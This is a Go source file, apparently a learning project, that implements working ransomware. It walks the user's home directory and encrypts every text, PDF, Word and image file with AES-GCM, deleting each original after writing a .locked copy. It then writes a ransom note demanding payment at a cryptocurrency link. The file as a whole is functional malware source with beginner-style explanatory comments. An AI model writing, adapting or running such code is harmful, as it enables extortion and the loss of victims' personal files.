package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
)

// default variables that can be overwritten
var (
	Key        string = "32charactersforthekeysoifillitup"
	amount     string = "10000"
	cryptoLink string = "bitcoin.com/uh4v3b33nh4ck3d"
)

func main() {
	// get AES in GCM mode
	key := []byte(Key) // must be 32 characters

	block, errBlock := aes.NewCipher(key) // set up AES cipher using private key
	if errBlock != nil {
		fmt.Println("error in key:", errBlock) // print out error then end program
		return
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		fmt.Println("error in gcm:", err)
		return
	}

	// Set path to the user's home directory
	dir, err := os.UserHomeDir()
	if err != nil {
		fmt.Println("error getting home directory:", err)
		return
	}

	// Set to encrypt these files only
	extensions := []string{".txt", ".pdf", ".docx", ".jpeg", ".png"}

	// Loop through files for encryption
	err = filepath.Walk(dir, func(path string, info os.FileInfo, errPath error) error {
		if errPath != nil {
			fmt.Println("error in pathing:", errPath)
			return errPath
		}

		// Encrypt files only, not folders
		if info != nil && !info.IsDir() {
			ext := strings.ToLower(filepath.Ext(path))
			// Only consider the given files to encrypt
			for _, checkExt := range extensions {
				if ext == checkExt {
					fmt.Println("Encrypting " + path + "...") // for checking

					// Start encrypting the file
					original, errFile := os.ReadFile(path)
					if errFile == nil { // this means no error
						// Encrypt bytes
						nonce := make([]byte, gcm.NonceSize()) // nonce means number used once
						if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
							fmt.Println("error generating nonce:", err)
							continue
						}
						encrypted := gcm.Seal(nonce, nonce, original, nil) // encrypt here

						// Write the encrypted contents
						errWrite := os.WriteFile(path+".locked", encrypted, 0666)
						// 0666 means setting permission to read and write during execution
						// .locked is custom file extension -- can change
						if errWrite == nil { // no error so delete the file
							os.Remove(path)
						} else {
							fmt.Println("error encrypting content:", errWrite) // for checking
						}
					} else {
						fmt.Println("error reading this file:", errFile)
					}
					break // no need to loop further since file can only have one ext
				}
			}
		}

		return nil // return nothing since return is needed
	})

	if err != nil {
		fmt.Println("error walking the path:", err)
		return
	}

	// Add a text file to inform the user
	textPath, err := os.Executable() // location of the program
	if err != nil {
		fmt.Println("error in getting the program:", err)
		return
	}

	execDir := filepath.Dir(textPath)
	textFilePath := filepath.Join(execDir, "YOU_HAVE_BEEN_HACKED.txt")
	content := "CONGRATULATIONS!\n" +
		"Some of your files, ESPECIALLY IMPORTANT FILES, have already been encrypted!\n" +
		"To bring them back, you can send your payment to our account.\n" +
		"PAY US P" + amount + " (less == bye bye files)\n" +
		"Pay here: " + cryptoLink + "\n\n" +
		"Don't worry. Once we have received your money, we will immediately email you\n" +
		"the file for decrypting all of the files we have encrypted. We promise!\n\n" +
		"BIG NOTE: If you incorrectly input the key in the file, all your files will be\n" +
		"          FOREVER GONE!! BEWARE!! YOU HAVE BEEN WARNED!!\n" +
		"          (we still want you to get your files back)"

	fileError := os.WriteFile(textFilePath, []byte(content), 0644)
	if fileError != nil {
		fmt.Println("error writing text:", fileError)
		return
	}
	fmt.Println("CREATED NEW FILE! Check it out on " + textFilePath) // for checking
}
